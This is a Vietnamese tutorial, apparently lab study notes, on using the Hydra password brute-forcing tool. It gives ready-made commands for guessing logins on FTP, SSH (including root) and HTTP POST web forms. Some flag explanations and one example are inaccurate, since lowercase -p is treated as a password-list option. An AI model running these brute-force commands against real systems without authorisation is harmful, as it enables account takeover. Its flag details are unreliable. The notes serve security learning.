# Hydra là gì?
* Hydra là một công cụ brute force one pass-cracking (đại khái là hack pass)

* Hydra có thể chạy qua một list và "brute force" các services xác thực. Tưởng tượng ta cố gắng mò pass của ai đó trong một service (SSH, Web Application Form, FTP, SNMP). Ta có thể sử dụng Hydra để chạy qua một password list với tốc độ mò ánh sáng và rồi đưa ra một khẩu chính xác.

----------------------------

# HDSD trước khi dùng
* Các options của Hydra được dùng tuỳ vào server (protocol) ta đang attack. VD, nếu muốn brute force FTP với username là ```user``` và một password list ```password.txt```, ta dùng cmd sau:

      hydra -l user -P password.txt ftp://MACHINE_IP
Dưới đây sẽ các có command sử dụng Hydra trên SSH và web form (POST method)

### SSH
      hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh   
* Các option:
  - ```-l```: Điền username mục tiêu để login
  - ```-p```: Path của password list
  - ```-t```: Số Threads sử dụng để chạy
* VD, ```hydra -l root -P password.txt MACHINE_IP -t 4 ssh``` sẽ chạy với những đối số sau:
  - Hydra sẽ sử dụng ```root``` như username cho ```ssh```
  - Nó sẽ thử cái password ở trong ```password.txt```
  - Sẽ có 4 threads được sử dụng để chạy cmd này
 
### Post Web Form
* Ta có thể sử dụng Hydra để brute force web form. Bạn phải biết rằng loại request của nó, GET hay POST là các phương thức thường được sử dụng. Bạn có thể sử dụng tab của browser (Bằng developer tool - F12) để kiểm tra loại request hoặc check source code

      sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
  - ```-l```: username để login vào web-form
  - ```-p```: pass list được sử dụng
  - ```http-post-form```: loại form là POST 
  - ```<path>```: login page URL, VD ```login.php```
  - ```<login_credentials>```: Username và pass được sử dụng để log in, VD: ```username=^USER^&password=^PASS^```
  - ```<invalid_response>```: Phẩn hồi khi login thất bại
  - ```-V```: verbose (thế thôi :||)
 
* Một ví dụ cụ thể hơn:

      hydra -l myozz -p rockyou.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Password is incorrect" -V
  - ```myozz``` là tên user
  - ```rockyou.txt``` là wordlist
  - ```http-post-form``` là method của web (check ở source code), nó còn có thể là GET
  - ```/login``` là pth 192.168.1.1/login của web, tuỳ vào từng web mà thay đổi path
  - Phần thông báo incorrect cũng thay đổi theo từng web (có thể check source để tìm)
